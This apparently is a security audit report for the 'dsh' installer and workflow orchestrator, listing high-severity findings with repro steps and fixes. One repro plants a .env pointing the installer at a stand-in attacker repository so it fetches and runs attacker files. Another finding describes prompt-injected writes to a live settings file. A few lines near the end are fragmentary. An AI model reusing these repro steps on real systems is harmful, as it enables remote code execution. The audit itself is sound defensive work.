## 🔴 High

### H-1 · Installer loads CWD `.env` unfiltered — redirect + env injection
`install_dsh.sh:66-98` · conf 88

`load_env_safely` exports **every** key from a CWD `.env` (no allowlist, no `LD_PRELOAD`/`BASH_ENV` denylist), *before* `DSH_REF`/`DSH_REPO_URL` defaults are applied (`:212`). `DSH_SOURCE_DIR` from `.env` also **skips ref validation entirely** (`:217`, `:302`).

**Repro:** `mkdir demo && cd demo && printf 'DSH_REPO_URL=https://raw.githubusercontent.com/evil/repo\n' > .env && ./install_dsh.sh` → all payload files pulled from the attacker repo, made executable, run.

**Fix:** allowlist exported keys (drop everything not `DSH_*`-safe; deny `LD_PRELOAD|BASH_ENV|SHELLOPTS|ENV`), set defaults before loading, or refuse to read `.env` from CWD.

### H-2 · Per-file download fallback bypasses the checksum gate
`install_dsh.sh:313-331` · conf 85

Archive curl failures are swallowed (`|| true`); when no archive materializes, every file is fetched individually from `$GITHUB_RAW` with **zero integrity verification**, and `verify_and_promote_staged` only checks existence/size (`:464`). `tests/installer_clean_room.test.mjs` never exercises the fallback (both tests set `DSH_SOURCE_DIR`).

**Fix:** fail closed if SHA256SUMS can't be fetched/verified; hash each fallback file against the manifest.

### H-3 · `resumeWorkflow` resurrects an already-consumed checkpoint → replay of an approved step
`config/declarative-orchestrator.mjs:1822-1828` · conf 82

On resume, if a *second* gate suspends, the `finally` block rewrites the **old** checkpoint (persisted `IN_PROGRESS` at `:1723`) back to `SUSPENDED_APPROVAL_REQUIRED`. Digest excludes `status` (`:1596-1607`) → the original token stays valid → the consumed step replays with its side effects (repeatable until token expiry). Latent today (all shipped personas have exactly one gate) but reachable with any user-authored multi-gate workflow — violates the FR-011 replay prohibition.

**Fix:** include `status`/`consumedAt` in the digest, or never downgrade an `IN_PROGRESS` checkpoint in `finally` (only the new gate gets `SUSPENDED_APPROVAL_REQUIRED`).

### H-4 · PEP fallback persona grants write to the live settings directory
`packages/dsh-dds-core/rbac-interceptor.js:167-190` · conf 80

When no persona is on the action context (the interactive chat path — nothing populates `exec.persona` outside the orchestrator, per the repo's own audit doc `docs/work/done/security-audit-2026-09.md:73-81`), a synthetic persona with `write: ['/var/lib/dsh/storages', …]` is used. Auth-off default → `DEFAULT_OPERATOR` admin → tenant gate passes → prompt-injected `write` to `/var/lib/dsh/storages/settings.yaml` (the live settings file, `docker-compose.yml:63`) is **GRANTED**.

**Fix:** fail closed on missing persona (deny instead of synthetic allowlist), and remove `/var/lib/dsh/storages` from write roots.

`config/profiles/headless/cordis.patch.yml:4`, `config/persona.mjs:436` · conf 88

### 🔴 High

*Fix:* ignore `config/audit-checkpoints/*`, `config/users/*`, `workspaces/users/*`, `config/keys/*`, `.host_keys/`.

**R-2 · Approval resume is broken in the default production stack — the Ed25519 public key is written where the verifier never looks** — `dsh.sh:56-71`, `docker-compose.yml:22,39,53`, `config/declarative-orchestrator.mjs:1664-1717` · conf 76 (lead-verified)

`dsh.sh` writes the host public key to `config/keys/approval_ed25519.pub` (visible in-container at `/etc/dsh/keys/...` via `./config:/etc/dsh:ro`), but the verifier only searches `cwd/config/keys`, `.host_keys`, `/root/.dsh/keys`, and `$DSH_CONFIG_SOURCE/keys` — and `DSH_CONFIG_SOURCE` is unset in the default compose (only the sandbox overlay sets it), `DSH_APPROVAL_PUBLIC_KEY` is empty by default, and `NODE_ENV=production` disables the HMAC fallback.
*Repro:* `./dsh.sh up`; let a gated workflow suspend; `./dsh.sh approve <id>`; resume → `DSH_APPROVAL_PUBLIC_KEY is required in container environment`, even though the key exists at `/etc/dsh/keys/`.
*Fix:* add `/etc/dsh/keys/approval_ed25519.pub` to the lookup list, or have the installer write `DSH_APPROVAL_PUBLIC_KEY` into `.env` from the generated key.
